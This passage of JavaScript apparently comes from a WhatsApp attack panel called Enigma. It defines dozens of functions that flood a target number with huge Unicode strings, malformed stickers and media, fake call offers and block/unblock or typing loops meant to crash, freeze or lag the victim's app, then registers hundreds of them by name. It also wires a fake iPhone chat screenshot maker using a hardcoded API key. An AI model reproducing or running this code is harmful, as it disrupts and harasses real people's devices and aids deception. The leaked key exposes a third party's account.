    albumMessage: { expectedImageCount: 99999999, expectedVideoCount: 99999999 }
  }, {}).catch(() => {});
}

async function ios_crs5(sock, target, opts = {}) {
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: 'ios_' + Date.now(),
      name: 'ꦾ'.repeat(65000), publisher: 'ꦾ'.repeat(65000),
      stickers: [], fileLength: '999999999',
      fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
      fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
      mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
      directPath: '/ios.enc', mediaKeyTimestamp: Date.now().toString()
    }
  }, {}).catch(() => {});
}

async function ios_lag1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(o.payloadSize),
      contextInfo: {
        mentionedJid: Array.from({ length: o.mentionCount }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_lag2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, { conversation: 'ꦾ'.repeat(o.payloadSize) }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_lag3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const now = Date.now();
  for (let i = 0; i < o.loop; i++) {
    const backMs = Math.floor(Math.random() * o.fakeTimestampMaxDays * 86400000);
    const fakeTs = now - backMs;
    const msg = generateWAMessageFromContent(target, {
      extendedTextMessage: { text: 'ꦾ'.repeat(o.payloadSize) + ' #' + i }
    }, { timestamp: new Date(fakeTs) });
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id, timestamp: fakeTs }).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_lag4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      audioMessage: {
        url: 'https://mmg.whatsapp.net/iw.enc',
        mimetype: 'audio/ogg; codecs=opus',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileLength: '9999999', seconds: 9999, ptt: true,
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        directPath: '/iw.enc',
        waveform: Buffer.alloc(o.waveformKB * 1024, 0x80)
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_lag5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const steps = 15;
  const stepSize = Math.floor(o.payloadSize / steps);
  for (let i = 1; i <= steps; i++) {
    await sock.relayMessage(target, { extendedTextMessage: { text: 'ꦾ'.repeat(stepSize * i) } }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_spm1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop * 5; i++) {
    await sock.relayMessage(target, {
      reactionMessage: {
        key: { remoteJid: target, fromMe: false, id: '3EB0' + crypto.randomBytes(8).toString('hex') },
        text: '😂'
      }
    }, {}).catch(() => {});
    await sleep(80);
  }
}

async function ios_spm2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      locationMessage: {
        degreesLatitude: -6.2 + Math.random(),
        degreesLongitude: 106.8 + Math.random(),
        name: 'ꦾ'.repeat(Math.min(o.payloadSize, 15000))
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_spm3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      contactMessage: {
        displayName: 'ꦾ'.repeat(Math.min(o.payloadSize, 15000)),
        vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + 'ꦾ'.repeat(Math.min(o.payloadSize, 15000)) + '\nEND:VCARD'
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_spm4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/is.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp', height: 512, width: 512,
        directPath: '/is.enc', fileLength: 999999
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_spm5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < Math.min(o.loop, 10); i++) {
    await sock.relayMessage(target, {
      pollCreationMessage: {
        name: 'ꦾ'.repeat(15000) + ' #' + i,
        options: Array.from({ length: 5 }, (_, j) => ({ optionName: 'ꦾ'.repeat(2000) + j })),
        selectableOptionsCount: 1
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_kil1(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
        { tag: 'video', attrs: { enc: 'vp8', dec: 'vp8', orientation: '0', screen_width: '0', screen_height: '0' } },
        { tag: 'net', attrs: { medium: '0' } }
      ]
    }]
  }).catch(() => {});
}

async function ios_kil2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop * 5; i++) {
    await sock.sendPresenceUpdate('composing', target).catch(() => {});
    await sleep(50);
    await sock.sendPresenceUpdate('paused', target).catch(() => {});
    await sleep(50);
  }
}

async function ios_kil3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop * 5; i++) {
    await sock.readMessages([{
      remoteJid: target,
      id: '3EB0' + crypto.randomBytes(8).toString('hex'),
      participant: target
    }]).catch(() => {});
    await sleep(50);
  }
}

async function ios_kil4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.updateBlockStatus(target, 'block').catch(() => {});
    await sleep(50);
    await sock.updateBlockStatus(target, 'unblock').catch(() => {});
    await sleep(50);
  }
}

async function ios_kil5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.chatModify({
      clear: true,
      lastMessages: [{
        key: { remoteJid: target, fromMe: true, id: '3EB0' + i },
        messageTimestamp: Math.floor(Date.now() / 1000)
      }]
    }, target).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_car1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(Math.min(o.payloadSize, 30000)) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, () => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(2000) },
          body: { text: 'ꦾ'.repeat(3000) }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_car2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(2000) },
          nativeFlowMessage: {
            buttons: [{ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(1500), id: 'c_' + i }) }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_car3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          nativeFlowMessage: {
            buttons: [{ name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(1500), url: 'https://x.com/' + 'ꦾ'.repeat(1500) + i }) }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_car4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          nativeFlowMessage: {
            buttons: [{ name: 'payment_info', buttonParamsJson: JSON.stringify({ reference_id: 'ic_' + i, amount: 999999999, currency: 'IDR' }) }]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_car5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: { text: 'ꦾ'.repeat(30000) },
      carouselMessage: {
        cards: Array.from({ length: o.cardCount }, (_, i) => ({
          header: { hasMediaAttachment: false, title: 'ꦾ'.repeat(1500) },
          nativeFlowMessage: {
            buttons: [
              { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(800), id: 'im_' + i }) },
              { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: 'ꦾ'.repeat(800), url: 'https://x.com/' + i }) }
            ]
          }
        })),
        messageVersion: 1
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_stk1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/ian.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp', height: 9999, width: 9999,
        directPath: '/ian.enc', fileLength: 999999999,
        isAnimated: true, firstFrameLength: 19904,
        firstFrameSidecar: 'KN4kQ5pyABRAgA=='
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_stk2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < Math.min(o.loop, 5); i++) {
    await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: 'istk_' + Date.now() + '_' + i,
        name: 'ꦾ'.repeat(50000), publisher: 'ꦾ'.repeat(50000),
        stickers: [], fileLength: '999999999',
        fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
        fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
        mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
        directPath: '/istk.enc', mediaKeyTimestamp: Date.now().toString()
      }
    }, {}).catch(() => {});
    await sleep(500);
  }
}

async function ios_stk3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/iinv.enc',
        fileSha256: '\u200B'.repeat(50),
        fileEncSha256: '\u200B'.repeat(50),
        mediaKey: '\u200B'.repeat(50),
        mimetype: 'image/webp', height: 512, width: 512,
        directPath: '/iinv.enc', fileLength: 999999999
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_stk4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < o.loop; i++) {
    await sock.relayMessage(target, {
      stickerMessage: {
        url: 'https://mmg.whatsapp.net/iz.enc',
        fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
        fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
        mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
        mimetype: 'image/webp', height: 0, width: 0,
        directPath: '/iz.enc', fileLength: 0
      }
    }, {}).catch(() => {});
    await sleep(o.delay);
  }
}

async function ios_stk5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/im.enc',
      fileSha256: 'mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=',
      fileEncSha256: 'tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=',
      mediaKey: 'ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=',
      mimetype: 'image/webp', height: 512, width: 512,
      directPath: '/im.enc', fileLength: 999999999,
      contextInfo: {
        mentionedJid: Array.from({ length: o.mentionCount }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_cal1(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '0' } },
        { tag: 'net', attrs: { medium: '0' } }
      ]
    }]
  }).catch(() => {});
}

async function ios_cal2(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        ...Array.from({ length: 50 }, () => ({
          tag: 'video',
          attrs: { enc: 'vp8', dec: 'vp8', orientation: '0', screen_width: '1920', screen_height: '1080', device_orientation: '0' }
        })),
        { tag: 'net', attrs: { medium: '3' } }
      ]
    }]
  }).catch(() => {});
}

async function ios_cal3(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'capability', attrs: { ver: '99' }, content: Buffer.alloc(50000, 0xFF) }
      ]
    }]
  }).catch(() => {});
}

async function ios_cal4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  for (let i = 0; i < Math.min(o.loop, 5); i++) {
    const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
    await sock.query({
      tag: 'call',
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: 'offer',
        attrs: { 'call-id': callId, 'call-creator': sock.user.id },
        content: [
          { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
          { tag: 'net', attrs: { medium: '3' } }
        ]
      }]
    }).catch(() => {});
    await sleep(1000);
  }
}

async function ios_cal5(sock, target, opts = {}) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().slice(0, 64);
  await sock.query({
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'terminate',
      attrs: { 'call-id': callId, 'call-creator': sock.user.id, reason: 'timeout' },
      content: []
    }]
  }).catch(() => {});
}

async function ios_pld1(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, { conversation: 'ꦾ'.repeat(o.payloadSize) }, {}).catch(() => {});
}

async function ios_pld2(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: 'ꦾ'.repeat(o.payloadSize),
      description: 'ꦾ'.repeat(o.payloadSize),
      title: 'ꦾ'.repeat(o.payloadSize)
    }
  }, {}).catch(() => {});
}

async function ios_pld3(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    conversation: '👨‍👩‍👧‍👦'.repeat(Math.min(o.payloadSize, 30000))
  }, {}).catch(() => {});
}

async function ios_pld4(sock, target, opts = {}) {
  const o = iosProfile(opts);
  const msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: '\u202E'.repeat(30000),
      contextInfo: {
        mentionedJid: Array.from({ length: o.mentionCount }, () =>
          Math.floor(Math.random() * 9999999999) + '@s.whatsapp.net')
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id }).catch(() => {});
}

async function ios_pld5(sock, target, opts = {}) {
  const o = iosProfile(opts);
  await sock.relayMessage(target, {
    conversation: '☠️'.repeat(Math.min(o.payloadSize, 80000))
  }, {}).catch(() => {});
}

async function ios_chn1(sock, target, opts = {}) {
  await ios_frz1(sock, target, opts);
  await sleep(800);
  await ios_lag1(sock, target, { ...opts, mentionCount: 3000 });
  await sleep(800);
  await ios_kil1(sock, target, opts);
}

async function ios_chn2(sock, target, opts = {}) {
  await ios_blk1(sock, target, opts);
  await sleep(500);
  await ios_spm1(sock, target, { ...opts, loop: 5 });
  await sleep(500);
  await ios_crs1(sock, target, opts);
}

async function ios_chn3(sock, target, opts = {}) {
  await ios_car1(sock, target, opts);
  await sleep(800);
  await ios_stk2(sock, target, { ...opts, loop: 3 });
  await sleep(800);
  await ios_cal3(sock, target, opts);
}

async function ios_chn4(sock, target, opts = {}) {
  await ios_lag3(sock, target, { ...opts, loop: 15 });
  await sleep(500);
  await ios_lag4(sock, target, { ...opts, loop: 8 });
}

async function ios_chn5(sock, target, opts = {}) {
  await ios_frz1(sock, target, opts);
  await sleep(500);
  await ios_blk1(sock, target, opts);
  await sleep(500);
  await ios_crs3(sock, target, opts);
  await sleep(500);
  await ios_kil1(sock, target, opts);
}

console.log('[🐛 IOS] 60 bug iOS loaded');

// ══════════════════════════════════════════════════════════════
// BUG REGISTRY — Map ID ke function
// ══════════════════════════════════════════════════════════════
const BUG_REGISTRY = {
  freeze:       bug_freeze,
  blank:        bug_blank,
  Enigma:       bug_Enigma,
  album:        bug_album,
  protocol:     bug_protocol,
  payment:      bug_payment,
  interactive:  bug_interactive,
  sticker:      bug_sticker,
  status:       bug_status,
  call:         bug_call,
  newsletter:   bug_newsletter,
  mention:      bug_mention,
  poll:         bug_poll,
  doc:          bug_doc,
  location:     bug_location,
  reaction:     bug_reaction,
  receipt:      bug_receipt,
  button:       bug_button,
  nested:       bug_nested,
  combo:        bug_combo,

  // ── 100 bug baru ──
  freeze1: bug_freeze1, freeze2: bug_freeze2, freeze3: bug_freeze3, freeze4: bug_freeze4, freeze5: bug_freeze5,
  freeze6: bug_freeze6, freeze7: bug_freeze7, freeze8: bug_freeze8, freeze9: bug_freeze9, freeze10: bug_freeze10,

  blank1: bug_blank1, blank2: bug_blank2, blank3: bug_blank3, blank4: bug_blank4, blank5: bug_blank5,
  blank6: bug_blank6, blank7: bug_blank7, blank8: bug_blank8, blank9: bug_blank9, blank10: bug_blank10,

  crash1: bug_crash1, crash2: bug_crash2, crash3: bug_crash3, crash4: bug_crash4, crash5: bug_crash5,
  crash6: bug_crash6, crash7: bug_crash7, crash8: bug_crash8, crash9: bug_crash9, crash10: bug_crash10,

  lag1: bug_lag1, lag2: bug_lag2, lag3: bug_lag3, lag4: bug_lag4, lag5: bug_lag5,
  lag6: bug_lag6, lag7: bug_lag7, lag8: bug_lag8, lag9: bug_lag9, lag10: bug_lag10,

  spam1: bug_spam1, spam2: bug_spam2, spam3: bug_spam3, spam4: bug_spam4, spam5: bug_spam5,
  spam6: bug_spam6, spam7: bug_spam7, spam8: bug_spam8, spam9: bug_spam9, spam10: bug_spam10,

  kill1: bug_kill1, kill2: bug_kill2, kill3: bug_kill3, kill4: bug_kill4, kill5: bug_kill5,
  kill6: bug_kill6, kill7: bug_kill7, kill8: bug_kill8, kill9: bug_kill9, kill10: bug_kill10,

  carousel1: bug_carousel1, carousel2: bug_carousel2, carousel3: bug_carousel3, carousel4: bug_carousel4, carousel5: bug_carousel5,
  carousel6: bug_carousel6, carousel7: bug_carousel7, carousel8: bug_carousel8, carousel9: bug_carousel9, carousel10: bug_carousel10,

  sticker1: bug_sticker1, sticker2: bug_sticker2, sticker3: bug_sticker3, sticker4: bug_sticker4, sticker5: bug_sticker5,
  sticker6: bug_sticker6, sticker7: bug_sticker7, sticker8: bug_sticker8, sticker9: bug_sticker9, sticker10: bug_sticker10,

  call1: bug_call1, call2: bug_call2, call3: bug_call3, call4: bug_call4, call5: bug_call5,
  call6: bug_call6, call7: bug_call7, call8: bug_call8, call9: bug_call9, call10: bug_call10,

  payload1: bug_payload1, payload2: bug_payload2, payload3: bug_payload3, payload4: bug_payload4, payload5: bug_payload5,
  payload6: bug_payload6, payload7: bug_payload7, payload8: bug_payload8, payload9: bug_payload9, payload10: bug_payload10,

   // ── 100 bug batch 2 ──
stanza1: bug_stanza1, stanza2: bug_stanza2, stanza3: bug_stanza3, stanza4: bug_stanza4, stanza5: bug_stanza5,
stanza6: bug_stanza6, stanza7: bug_stanza7, stanza8: bug_stanza8, stanza9: bug_stanza9, stanza10: bug_stanza10,

media1: bug_media1, media2: bug_media2, media3: bug_media3, media4: bug_media4, media5: bug_media5,
media6: bug_media6, media7: bug_media7, media8: bug_media8, media9: bug_media9, media10: bug_media10,

presence1: bug_presence1, presence2: bug_presence2, presence3: bug_presence3, presence4: bug_presence4, presence5: bug_presence5,
presence6: bug_presence6, presence7: bug_presence7, presence8: bug_presence8, presence9: bug_presence9, presence10: bug_presence10,

group1: bug_group1, group2: bug_group2, group3: bug_group3, group4: bug_group4, group5: bug_group5,
group6: bug_group6, group7: bug_group7, group8: bug_group8, group9: bug_group9, group10: bug_group10,

crypto1: bug_crypto1, crypto2: bug_crypto2, crypto3: bug_crypto3, crypto4: bug_crypto4, crypto5: bug_crypto5,
crypto6: bug_crypto6, crypto7: bug_crypto7, crypto8: bug_crypto8, crypto9: bug_crypto9, crypto10: bug_crypto10,

business1: bug_business1, business2: bug_business2, business3: bug_business3, business4: bug_business4, business5: bug_business5,
business6: bug_business6, business7: bug_business7, business8: bug_business8, business9: bug_business9, business10: bug_business10,

newsletter1: bug_newsletter1, newsletter2: bug_newsletter2, newsletter3: bug_newsletter3, newsletter4: bug_newsletter4, newsletter5: bug_newsletter5,
newsletter6: bug_newsletter6, newsletter7: bug_newsletter7, newsletter8: bug_newsletter8, newsletter9: bug_newsletter9, newsletter10: bug_newsletter10,

device1: bug_device1, device2: bug_device2, device3: bug_device3, device4: bug_device4, device5: bug_device5,
device6: bug_device6, device7: bug_device7, device8: bug_device8, device9: bug_device9, device10: bug_device10,

privacy1: bug_privacy1, privacy2: bug_privacy2, privacy3: bug_privacy3, privacy4: bug_privacy4, privacy5: bug_privacy5,
privacy6: bug_privacy6, privacy7: bug_privacy7, privacy8: bug_privacy8, privacy9: bug_privacy9, privacy10: bug_privacy10,

chain1: bug_chain1, chain2: bug_chain2, chain3: bug_chain3, chain4: bug_chain4, chain5: bug_chain5,
chain6: bug_chain6, chain7: bug_chain7, chain8: bug_chain8, chain9: bug_chain9, chain10: bug_chain10,
lagjam1: bug_lagjam1,
lagjam2: bug_lagjam2,
lagjam3: bug_lagjam3,
lagjam4: bug_lagjam4,
lagjam5: bug_lagjam5,
lagjam6: bug_lagjam6,
// ── ANDROID 60 ──
and_frz1, and_frz2, and_frz3, and_frz4, and_frz5,
and_blk1, and_blk2, and_blk3, and_blk4, and_blk5,
and_crs1, and_crs2, and_crs3, and_crs4, and_crs5,
and_lag1, and_lag2, and_lag3, and_lag4, and_lag5,
and_spm1, and_spm2, and_spm3, and_spm4, and_spm5,
and_kil1, and_kil2, and_kil3, and_kil4, and_kil5,
and_car1, and_car2, and_car3, and_car4, and_car5,
and_stk1, and_stk2, and_stk3, and_stk4, and_stk5,
and_cal1, and_cal2, and_cal3, and_cal4, and_cal5,
and_pld1, and_pld2, and_pld3, and_pld4, and_pld5,
and_chn1, and_chn2, and_chn3, and_chn4, and_chn5,

// ── IOS 60 ──
ios_frz1, ios_frz2, ios_frz3, ios_frz4, ios_frz5,
ios_blk1, ios_blk2, ios_blk3, ios_blk4, ios_blk5,
ios_crs1, ios_crs2, ios_crs3, ios_crs4, ios_crs5,
ios_lag1, ios_lag2, ios_lag3, ios_lag4, ios_lag5,
ios_spm1, ios_spm2, ios_spm3, ios_spm4, ios_spm5,
ios_kil1, ios_kil2, ios_kil3, ios_kil4, ios_kil5,
ios_car1, ios_car2, ios_car3, ios_car4, ios_car5,
ios_stk1, ios_stk2, ios_stk3, ios_stk4, ios_stk5,
ios_cal1, ios_cal2, ios_cal3, ios_cal4, ios_cal5,
ios_pld1, ios_pld2, ios_pld3, ios_pld4, ios_pld5,
ios_chn1, ios_chn2, ios_chn3, ios_chn4, ios_chn5,
};

console.log('[🐛 BUG] 120 function bug ter-register (20 lama + 100 baru)');



// ══════════════════════════════════════════════════════════════
const JEREXD_BASE = 'https://api.jerexd.my.id';
const JEREXD_KEY = 'C2t4_t9fQaufHPTH';

async function jerexdFetch(path, params = {}, method = 'GET') {
  try {
    const url = `${JEREXD_BASE}${path}`;
    const config = {
      timeout: 20000,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Enigma-Panel/1.0'
      }
    };

    let res;
    if (method === 'POST') {
      res = await axios.post(url, { ...params, apikey: JEREXD_KEY }, config);
    } else {
      res = await axios.get(url, { params: { ...params, apikey: JEREXD_KEY }, ...config });
    }

    return { ok: true, data: res.data };
  } catch (e) {
    console.error(`[JEREXD] ${path} error:`, e.message);
    return { ok: false, message: e.message };
  }
}

// ── 1. iQC — Fake Chat Gaya iPhone ────────────────────────────
app.get('/api/menu/iqc', async (req, res) => {
  const { key, text, phone, name, time } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  if (!text) return res.json({ valid: false, message: 'Text required' });

  const result = await jerexdFetch('/api/maker/iqc', {
    text: text,
    phone: phone || '628123456789',
    name: name || 'User',
    time: time || ''
  });

  if (!result.ok) {
    return res.json({ valid: false, message: result.message });
  }

  return res.json({ valid: true, data: result.data });
});

// ── 2. Fake Lobby FF — Tinggal Ganti Nama ─────────────────────
app.get('/api/menu/fakelobbyff', async (req, res) => {
  const { key, nickname, rank } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
  if (!nickname) return res.json({ valid: false, message: 'Nickname required' });

  const result = await jerexdFetch('/api/maker/fakelobbyff', {
    nickname: nickname,
    rank: rank || 'Heroic'
  });

  if (!result.ok) {
    return res.json({ valid: false, message: result.message });
  }

  return res.json({ valid: true, data: result.data });
});

console.log('[🎮 JEREXD] iQC + Fake Lobby FF registered');


// ===== ENIGMA PUBLIC + PRIVATE CHAT (HTTP) =====
const publicChatMessages = [];
const privateChatMessages = [];
const MAX_CHAT_MESSAGES = 500;
function chatUser(req) {
  const key = String(req.query.key || req.body?.key || '').trim();
  const info = activeKeys[key];
  return info ? { key, username: String(info.username || 'User') } : null;
}
function chatPush(list, item) {
  list.push(item);
  while (list.length > MAX_CHAT_MESSAGES) list.shift();
}
app.get('/api/public-chat/list', (req, res) => {
  if (!chatUser(req)) return res.status(401).json({ valid: false, message: 'Invalid key' });
  const limit = Math.min(Math.max(Number(req.query.limit) || 100, 1), 200);
  return res.json({ valid: true, messages: publicChatMessages.slice(-limit), count: publicChatMessages.length, serverTime: Date.now() });
});
app.post('/api/public-chat/send', express.json(), (req, res) => {
  const user = chatUser(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid key' });
  const text = String(req.body?.message || '').trim();
  if (!text) return res.status(400).json({ valid: false, message: 'Message is required' });
  if (text.length > 2000) return res.status(413).json({ valid: false, message: 'Message too long' });
  const item = { id: user.username + '_' + Date.now(), username: user.username, from: user.username, message: text, timestamp: Date.now(), isAI: false };
  chatPush(publicChatMessages, item);
  return res.status(201).json({ valid: true, message: item });
});
app.get('/api/private-chat/list', (req, res) => {
  const user = chatUser(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid key' });
  const withUser = String(req.query.with || req.query.username || '').trim();
  if (!withUser) return res.status(400).json({ valid: false, message: 'with username is required' });
  const messages = privateChatMessages.filter(m => (m.from === user.username && m.to === withUser) || (m.from === withUser && m.to === user.username));
  return res.json({ valid: true, messages, count: messages.length, serverTime: Date.now() });
});
app.post('/api/private-chat/send', express.json(), (req, res) => {
  const user = chatUser(req);
  if (!user) return res.status(401).json({ valid: false, message: 'Invalid key' });
